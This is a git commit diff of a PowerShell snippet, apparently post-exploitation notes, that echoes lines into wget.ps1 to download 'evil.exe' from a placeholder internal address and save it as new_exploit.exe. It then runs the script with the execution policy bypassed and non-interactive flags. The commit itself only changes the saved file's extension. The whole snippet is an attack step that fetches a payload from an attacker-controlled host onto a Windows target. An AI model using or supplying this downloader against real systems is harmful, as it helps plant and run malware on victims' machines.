c7aed7f71641a6060aae1b0bb62c689404a90fe3
Dante-cpu <128062425+Dante-cpu@users.noreply.github.com>
2025-02-13 21:57:22 +0300

    Update wget.ps1

--- wget.ps1
+++ wget.ps1
@@ -1,7 +1,7 @@
 PS  echo '$storageDir = $pwd' > wget.ps1
 PS  echo '$webclient = New-Object System.Net.WebClient' >> wget.ps1
 PS  echo '$url = "http://192.168.x.x/evil.exe"' >> wget.ps1
-PS  echo '$file = "new_exploit.py"' >> wget.ps1
+PS  echo '$file = "new_exploit.exe"' >> wget.ps1
 PS  echo '$webclient.DownloadFile($url, $file)' >> wget.ps1
 
 PS  powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
